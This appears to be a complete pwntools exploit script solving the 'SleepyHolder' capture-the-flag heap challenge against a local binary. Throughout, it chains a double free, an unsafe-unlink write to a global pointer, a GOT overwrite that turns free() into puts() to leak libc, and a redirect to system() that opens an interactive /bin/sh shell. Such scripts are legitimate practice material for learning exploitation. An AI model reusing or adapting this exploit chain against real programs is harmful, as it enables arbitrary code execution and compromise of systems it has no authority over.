# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './SleepyHolder-patch'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

# small 0x28
# big 0xfa0
# huge 0x61A80
# 1. Keep secret
# 2. Wipe secret
# 3. Renew secret
# 1
# What secret do you want to keep?
# 1. Small secret
# 2. Big secret
# 3. Keep a huge secret and lock it forever
# 2
# Tell me your secret:
# fff
# 1. Keep secret
# 2. Wipe secret
# 3. Renew secret


def keep(id, data):
    r.recvuntil("3. Renew secret")
    r.sendline('1')
    r.recvuntil("What secret do you want to keep?")
    r.sendline(str(id))
    r.recvuntil("Tell me your secret:")
    r.send(data) #?? send/sendline

def wipe(id):
    r.recvuntil("3. Renew secret")
    r.sendline('2')
    r.sendline(str(id))

def renew(id, data):
    r.recvuntil("3. Renew secret")
    r.sendline('3')
    r.recvuntil("Which Secret do you want to renew?")
    r.sendline(str(id))
    r.recvuntil("Tell me your secret:")
    r.send(data) #?? send/sendline   


keep(1, "A")
keep(2, "A")
wipe(1)
keep(3, "B")
wipe(1) # double free

target = 0x06020D0 # smallptr

payload = ''
payload += p64(0)+p64(0x21)
payload += p64(target-0x18)+p64(target-0x10) 
payload += p64(0x20)
keep(1, payload)
wipe(2)

payload = ''
payload += p64(0) + p64(binn.got['puts'])+p64(binn.got['free'])+p64(binn.got['free']) # big huge small
payload += p32(1) * 3
renew(1, payload)

renew(1, p64(binn.plt['puts']))
wipe(2)


print("xx: ", r.recvuntil("2. Big secret\n"))
# print("xx: ", r.recv(10))
libc_base = u64(r.recv(6).ljust(8, '\x00')) - 0x6f690


keep(2, '/bin/sh\0')
renew(1, p64(libc_base+0x45390))

wipe(2)

print(str(r.proc.pid))


gdb.attach(r, """
heap
echo x/10gx 0x06020D0-0x18\\n
x/10gx 0x06020D0-0x18

""");
print(str(r.proc.pid))
print("libc: ", hex(libc_base))
r.interactive()

